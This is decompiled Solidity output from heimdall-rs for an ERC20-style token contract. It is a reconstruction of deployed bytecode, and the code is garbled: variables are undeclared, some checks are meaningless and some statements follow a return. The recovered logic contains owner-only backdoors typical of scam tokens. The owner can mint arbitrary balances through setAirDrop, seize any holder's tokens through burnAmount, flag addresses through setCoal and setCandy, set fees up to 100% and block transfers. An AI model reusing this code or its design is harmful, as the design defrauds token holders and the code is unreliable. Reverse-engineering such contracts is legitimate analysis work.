// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 18;
    
    uint256 public fee;
    bytes32 store_k;
    address public owner;
    bytes32 store_c;
    uint256 public numbers;
    uint256 public limits;
    uint256 public totalSupply;
    bool public reward;
    bool public autoCoal;
    mapping(bytes32 => bytes32) storage_map_d;
    mapping(bytes32 => bytes32) storage_map_i;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x89fe8507
    /// @custom:signature   setNumbers(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function setNumbers(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        numbers = arg0;
    }
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_c) {
            if (store_c - ((store_c / 0x02) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));
                uint256 var_d = store_c / 0x02;
                if (store_c) {
                    if (store_c - ((store_c / 0x02) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_c / 0x02) {
                            if (0x1f < (store_c / 0x02)) {
                                var_a = 0x68;
                                var_e = storage_map_d[var_a];
                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {
                                    uint256 var_e = (var_c + 0x20) - var_c;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        address var_a = address(msg.sender);
        var_b = 0x66;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_d[var_a] > (storage_map_d[var_a] + arg1)), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender) - 0, "ERC20: approve to the zero address");
        require(address(arg0) - 0, "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x66;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_d[var_a] = storage_map_d[var_a] + arg1;
        uint256 var_d = storage_map_d[var_a] + arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_a] + arg1);
        var_d = 0x01;
        return 0x01;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);
        var_g = 0x22;
        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);
        var_g = 0x24;
        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x59fa6d72
    /// @custom:signature   Unresolved_59fa6d72(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Unresolved_59fa6d72(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        autoCoal = (arg0 * 0x01) | (uint248(autoCoal));
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        address var_a = address(msg.sender);
        var_b = 0x66;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_d[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x25;
        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;
        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;
        require(address(msg.sender) - 0, "ERC20: approve to the zero address");
        require(address(arg0) - 0, "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x66;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_d[var_a] = storage_map_d[var_a] - arg1;
        uint256 var_c = storage_map_d[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xa1c61f50
    /// @custom:signature   Unresolved_a1c61f50(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Unresolved_a1c61f50(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        reward = (arg0 * 0x01) | (uint248(reward));
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x6d2f2ed6
    /// @custom:signature   removeCandy(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function removeCandy(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_f = address(arg0);
        var_g = 0x97;
        storage_map_i[var_f] = (0 * 0x01) | (uint248(storage_map_i[var_f]));
    }
    
    /// @custom:selector    0xce1fd380
    /// @custom:signature   setCoal(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setCoal(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_f = address(arg0);
        var_g = 0x98;
        storage_map_i[var_f] = (0x01 * 0x01) | (uint248(storage_map_i[var_f]));
    }
    
    /// @custom:selector    0x56c54ba9
    /// @custom:signature   Withdraw(address arg0, uint256 arg1, address arg2) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    /// @param              arg2 ["address", "uint160", "bytes20", "int160"]
    function Withdraw(address arg0, uint256 arg1, address arg2) public payable {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(arg2 == (address(arg2)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0) - 0);
        var_a = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
        var_b = address(arg2);
        uint256 var_d = arg1;
        (bool success, bytes memory ret0) = address(arg0).{ value: 0 ether }Unresolved_a9059cbb(var_b); // call
        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_f == (var_f));
        (bool success, bytes memory ret0) = address(arg2).transfer(arg1);
    }
    
    /// @custom:selector    0xde8f1517
    /// @custom:signature   setAirDrop(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function setAirDrop(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_f = address(arg0);
        var_g = 0x65;
        require(!storage_map_i[var_f] > (storage_map_i[var_f] + arg1));
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_h = 0x11;
        var_f = address(arg0);
        var_g = 0x65;
        storage_map_i[var_f] = storage_map_i[var_f] + arg1;
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(msg.sender) - 0, "ERC20: approve to the zero address");
        require(address(arg0) - 0, "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x66;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_d[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xf2fde38b
    /// @custom:signature   transferOwnership(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferOwnership(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0) - 0, "Ownable: new owner is the zero address");
        owner = (address(arg0) * 0x01) | (uint96(owner));
        emit OwnershipTransferred(address(owner / 0x01), address(arg0));
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x26;
        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;
        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(msg.sender) - 0, "Value exceeds balance");
        require(address(arg0) - 0, "Value exceeds balance");
        require(!(!(address(msg.sender)) == (address(owner / 0x01))), "Value exceeds balance");
        address var_a = address(msg.sender);
        var_b = 0x97;
        require(!(!bytes1(storage_map_d[var_a] / 0x01)), "Value exceeds balance");
        require(!(!bytes1(storage_map_d[var_a] / 0x01)), "Value exceeds balance");
        var_a = address(msg.sender);
        var_b = 0x65;
        require(!(storage_map_d[var_a] < arg1), "Value exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x15;
        var_g = 0x56616c756520657863656564732062616c616e63650000000000000000000000;
        if (address(msg.sender) == (address(owner / 0x01))) {
            var_a = address(msg.sender);
            var_b = 0x97;
            if (storage_map_d[var_a] / 0x01) {
                if (storage_map_d[var_a] / 0x01) {
                    var_a = address(msg.sender);
                    var_b = 0x65;
                    require(bytes1(storage_map_d[var_a] / 0x01));
                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                    var_h = 0x11;
                    var_a = address(msg.sender);
                    var_b = 0x65;
                    storage_map_d[var_a] = storage_map_d[var_a] - arg1;
                    var_a = address(arg0);
                    var_b = 0x65;
                    require(bytes1(storage_map_d[var_a] / 0x01));
                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                    var_h = 0x11;
                    var_a = address(arg0);
                    var_b = 0x65;
                    storage_map_d[var_a] = storage_map_d[var_a] + arg1;
                    uint256 var_c = arg1;
                    emit Transfer(address(msg.sender), address(arg0), arg1);
                    var_c = 0x01;
                    return 0x01;
                    require(!(storage_map_d[var_a] - arg1) > storage_map_d[var_a]);
                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                    var_h = 0x11;
                    require(!storage_map_d[var_a] > (storage_map_d[var_a] + arg1));
                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                    var_h = 0x12;
                    require(!(arg1) & (fee > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1)));
                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                    var_h = 0x11;
                    require(0x64);
                }
                require(!(arg1 - ((arg1 * fee) / 0x64)) > arg1);
            }
        }
        var_a = address(msg.sender);
        var_b = 0x98;
        require(!bytes1(storage_map_d[var_a] / 0x01));
        require(!numbers > 0);
        require(!arg1 > numbers);
        require(!(bytes1(reward / 0x01)), "Error");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x05;
        var_g = 0x4572726f72000000000000000000000000000000000000000000000000000000;
        require(!limits > 0);
        var_a = address(msg.sender);
        var_b = 0x65;
        require(!storage_map_d[var_a] > limits);
        if (!autoCoal / 0x01) {
        }
        if (address(msg.sender) == (address(owner / 0x01))) {
            if (address(msg.sender) == (address(owner / 0x01))) {
            }
        }
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x23;
        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;
        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x25;
        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xfb8bd26f
    /// @custom:signature   burnAmount(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function burnAmount(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0) - (address(owner / 0x01)), "TARGET ERROR");
        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), "TARGET ERROR");
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        address var_f = address(arg0);
        var_h = 0x65;
        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), "TARGET ERROR");
        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), "TARGET ERROR");
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        var_f = address(arg0);
        var_h = 0x65;
        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), "TARGET ERROR");
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        var_f = address(arg0);
        var_h = 0x65;
        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);
        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), "TARGET ERROR");
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        var_f = 0xdead;
        var_h = 0x65;
        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), "TARGET ERROR");
        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        var_f = 0xdead;
        var_h = 0x65;
        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x0c;
        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x65;
        address var_c = storage_map_d[var_a];
        return storage_map_d[var_a];
    }
    
    /// @custom:selector    0x63244555
    /// @custom:signature   setCandy(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setCandy(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_f = address(arg0);
        var_g = 0x97;
        storage_map_i[var_f] = (0x01 * 0x01) | (uint248(storage_map_i[var_f]));
    }
    
    /// @custom:selector    0x03204989
    /// @custom:signature   removeCoal(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function removeCoal(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_f = address(arg0);
        var_g = 0x98;
        storage_map_i[var_f] = (0 * 0x01) | (uint248(storage_map_i[var_f]));
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_k) {
            if (store_k - ((store_k / 0x02) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_k / 0x02)) / 0x20) * 0x20));
                uint256 var_d = store_k / 0x02;
                if (store_k) {
                    if (store_k - ((store_k / 0x02) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_k / 0x02) {
                            if (0x1f < (store_k / 0x02)) {
                                var_a = 0x69;
                                var_e = storage_map_d[var_a];
                                if ((0x20 + var_c) + (store_k / 0x02) > (0x20 + (0x20 + var_c))) {
                                    uint256 var_e = (var_c + 0x20) - var_c;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public payable
    function renounceOwnership() public payable {
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        owner = 0 | (uint96(owner));
        emit OwnershipTransferred(address(owner / 0x01), 0);
    }
    
    /// @custom:selector    0x69fe0e2d
    /// @custom:signature   setFee(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function setFee(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(!arg0 < 0);
        require(!arg0 > 0x64);
        fee = arg0;
    }
    
    /// @custom:selector    0xae96ffe6
    /// @custom:signature   setLimits(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function setLimits(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        limits = arg0;
    }
}